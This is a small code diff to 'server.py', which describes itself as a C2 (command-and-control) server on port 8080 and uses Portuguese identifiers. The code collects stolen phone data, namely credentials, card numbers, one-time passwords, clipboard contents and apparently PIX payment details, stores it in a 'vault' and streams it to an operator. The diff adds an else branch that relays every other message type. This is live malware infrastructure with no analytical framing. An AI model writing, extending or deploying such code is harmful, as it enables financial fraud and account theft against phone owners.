@@ -1,4 +1,4 @@
-﻿# server.py - C2, porta 8080
+# server.py - C2, porta 8080
 import asyncio, json, os, socket, time
 from aiohttp import web, WSMsgType
 
@@ -175,6 +175,8 @@ async def phone(req):
                 elif o.get("t") in ("cred", "cartao", "otp", "clip", "pixvisto"):
                     cofre(o.get("t"), dev, o.get("o"))
                     await bcast({"k": "log", "d": o}, dev)
+                else:
+                    await bcast(o, dev)
     except Exception as e:
         print(" ! erro em %s: %s" % (dev, e))
     finally:
